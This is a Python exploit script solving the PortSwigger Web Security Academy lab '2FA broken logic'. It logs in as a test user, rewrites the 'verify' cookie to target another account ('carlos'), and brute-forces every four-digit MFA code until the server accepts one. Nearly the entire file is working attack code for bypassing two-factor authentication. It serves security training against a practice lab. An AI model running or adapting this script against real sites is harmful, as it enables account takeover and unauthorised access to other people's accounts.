################################################################
#
# Author: Ahmed Elqalawii
#
# Date: 26/8/2023
#
# PortSwigger LAB: 2FA broken logic
#
# Steps: 1. Get a valid session using valid creds
#        2. GET /login2 page
#        3. Brute force the mfa-codes
#
#################################################################

###########
# imports
###########
import requests
import re
from colorama import Fore
import time

# change this url
url = "https://0aac006404b5c69f83a4381c00f50035.web-security-academy.net"


############################################################
#  Function used to get a valid session using correct creds
############################################################
def get_valid_session(url, username, password):
    data = {
        "username": username,
        "password": password
    }
    try:
        res = requests.post(url=f"{url}/login",
                            data=data, allow_redirects=False)
        session = re.findall("session=(.*); Secure",
                             res.headers['set-cookie'])[0]
        print(Fore.WHITE + '1. Obtaining a valid session ..☑️')
        return session
    except:
        print(Fore.RED + "Failed to get a valid session through exception")


#####################################
# Function used to GET /login2 page
#####################################
def fetch_login2(url, user, session):
    headers = {
        "Cookie": f"session={session}; verify={user}",
    }
    try:
        res = requests.get(url=f"{url}/login2",
                           headers=headers)
        if res.status_code == 200:
            print(Fore.WHITE + '2. GET /login2 page ..☑️')
            return
    except:
        print(Fore.RED + "Failed to fetch /login2 through exception")


#####################################
# Function used to POST the mfa code
#####################################
def post_code(url, user, session, code):
    data = {
        "mfa-code": f"{code:04}"
    }
    headers = {
        "Cookie": f"session={session}; verify={user}",
    }
    try:
        res = requests.post(
            url=f"{url}/login2", data=data, headers=headers, allow_redirects=False)
        return res
    except:
        print(Fore.RED + "Failed to post code through exception")


###############################
# Starting point of the script
###############################
session = get_valid_session(url, "wiener", "peter")
fetch_login2(url, "carlos", session)
print(Fore.WHITE + "3. Start brute forcing mfa-code ..")
start_time = time.time()
for code in range(0, 10000):
    res = post_code(url, "carlos", session, code)
    if res != None and res.status_code == 302:
        print(Fore.WHITE +
              f"\n[*] {code:04} => " + Fore.GREEN + "Correct")
        elapsed_time = int((time.time() - start_time) / 60)
        print(Fore.GREEN + "✅ Finished in: " +
              Fore.WHITE + str(elapsed_time) + " minutes")
        exit(0)
    else:
        print("\r" + Fore.WHITE +
              f"[*] {code:04} => " + Fore.RED + "Incorrect", flush=True, end='\r')


elapsed_time = int((time.time() - start_time) / 60)
print(Fore.GREEN + "✅ Finished in: " +
      Fore.WHITE + str(elapsed_time) + " minutes")
